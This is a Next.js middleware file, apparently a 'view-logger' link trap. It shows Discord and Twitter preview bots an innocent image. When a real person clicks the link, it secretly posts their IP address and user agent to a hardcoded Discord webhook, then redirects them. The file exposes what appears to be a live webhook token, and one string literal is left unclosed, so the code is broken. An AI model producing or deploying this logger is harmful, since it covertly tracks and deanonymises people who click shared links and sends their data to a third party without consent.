import { NextRequest, NextResponse, userAgent } from 'next/server';

const webhook = "https://discord.com/api/webhooks/1216820645711843478/QRIgnJF2GR6zofyQsdCMJ3uD6ALwtO-tK73SHh-5HGitJmh9u6T-aRF1uic_PrPiBXcD" // The URL of your Discord/Guilded webhook

export async function middleware(req){
  const ua = userAgent(req)?.ua;
  const discordbot = ["Mozilla/5.0 (compatible; Discordbot/", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:92.0) Gecko/20100101 Firefox/92.0", "Twitterbot/].find(u=>ua?.startsWith(u));
  const vercelbot = ua?.startsWith("Vercelbot/");
  const path = req.nextUrl.pathname;
  const img = req.nextUrl.searchParams.get('img') ? new URL(req.nextUrl.searchParams.get('img')) : new URL("/mini.png", req.url);
  const redirect = req.nextUrl.searchParams.get('red');
  const body = {
    "embeds":[{
      "title":"Triggered view-logger V2",
      "fields":[{name:"Source", value:(discordbot ? "discord" : vercelbot ? "Vercel" : "User"), inline: true},{name:"Path", value: path, inline: true},{name:"IP", value: req.ip, inline: true}, {name: "User agent", value: ua, inline: false}]
    }],
  };
  await fetch(webhook,{body: JSON.stringify(body), headers:{"content-type":"application/json"}, method:"POST"})
  if(discordbot||vercelbot){
    // Return the image.
    return NextResponse.rewrite(img)
  }else{
    // Make a message for whoever takes the risk to directly click.
    return redirect ? NextResponse.redirect(new URL(redirect)) : NextResponse.rewrite(new URL("/page.html", req.url));
  }
}
